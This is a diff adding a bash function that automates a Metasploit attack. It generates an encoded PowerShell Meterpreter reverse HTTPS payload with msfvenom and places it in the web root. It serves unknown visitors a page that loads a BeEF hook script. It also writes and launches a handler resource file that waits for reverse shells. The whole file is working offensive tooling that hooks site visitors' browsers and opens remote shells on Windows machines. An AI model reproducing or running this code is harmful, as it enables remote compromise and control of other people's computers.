@@ -1,0 +1,75 @@
+psh_winmetrev_https() {
+  # Makes a Windows Meterpreter Reverse HTTPS Payload as a powershell
+  # modified to use beefhooks for anyone visiting the site and the UUID is wrong
+  # enables UUID Tracking (whitelistin) for payloads, ignores the rest
+  lhost=$1
+  lport=$2
+  setpayvars() {
+    d_beef="http://BeeFHostHere.tld:port/hook.js"
+    d_payload="-p windows/meterpreter/reverse_https"
+    d_lhost="set lhost=$lhost"
+    d_lport="set lport=$lport"
+    d_uri="luri='/'"
+    d_encode="-e x86/shikata_ga_nai -i 10"
+    d_nop="-n 100"
+    d_format="-f psh"
+    d_bad="-b '\x00\xff'"
+    d_small="--smallest"
+    d_unknown_res="HttpUnknownRequestResponse=\"<html><body><h1>It works</h1><script type='text/javascript' src='`echo $d_beef`'></script></body></html>\""
+    d_ua="MeterpreterUserAgent=\"Mozilla (Server Firefox)\""
+    d_ignore="IgnoreUnknownPayloads=true"
+    d_uuid="PayloadUUIDName=WinMetRevHTTPS"
+    d_track="PayloadUUIDTracking=true"
+    d_work="WORKSPACE "
+  }
+  setpayvars
+  paygen() {
+    paydirt=`echo \
+      $d_payload \
+      $d_lhost \
+      $d_lport \
+      $d_encode \
+      $d_nop \
+      $d_format \
+      $d_bad \
+      $d_small \
+      $d_unknown_res \
+      $d_ua \
+      $d_ignore \
+      $d_uuid \
+      $d_track`
+    msfvenom $paydirt > /var/www/html/psh_winmetrev_https.psh
+  }
+  paygen
+  sethandlervars() {
+    d_use="use exploit/multi/handler"
+    d_payload="set payload windows/meterpreter/reverse_https"
+    d_dishandler="set DisablePayloadHandler true"
+    d_lhost="set lhost 0.0.0.0"
+    d_lport="set lport `echo $lport`"
+    d_uri="set luri '/'"
+    d_unknown_res="set HttpUnknownRequestResponse \"<html><body><h1>It works</h1><script type='text/javascript' src='`echo $d_beef`'></script></body></html>\""
+    d_ua="set MeterpreterUserAgent \"Mozilla (Server Firefox)\""
+    d_ignore="set IgnoreUnknownPayloads true"
+    d_uuid="set PayloadUUIDName WinMetRevHTTPS"
+    d_track="set PayloadUUIDTracking true"
+    d_work="WORKSPACE "
+  }
+  sethandlervars
+  rcgen() {
+    echo $d_use > $msfs/winmetrevhttps.rc
+    echo $d_payload >> $msfs/winmetrevhttps.rc
+    echo $d_lport >> $msfs/winmetrevhttps.rc
+    echo $d_lhost >> $msfs/winmetrevhttps.rc
+    echo $d_uri >> $msfs/winmetrevhttps.rc
+    echo $d_unknown_res >> $msfs/winmetrevhttps.rc
+    echo $d_ua >> $msfs/winmetrevhttps.rc
+    echo $d_ignore >> $msfs/winmetrevhttps.rc
+    echo $d_uuid >> $msfs/winmetrevhttps.rc
+    echo $d_track >> $msfs/winmetrevhttps.rc
+    echo exploit -j -z >> $msfs/winmetrevhttps.rc
+  }
+  rcgen
+  makeXtermLog "Meterpreter_Handler_WinMetRevHTTPS" "$msfc -r $msfs/winmetrevhttps.rc" &
+}
+psh_winmetrev_https 127.0.0.1 443
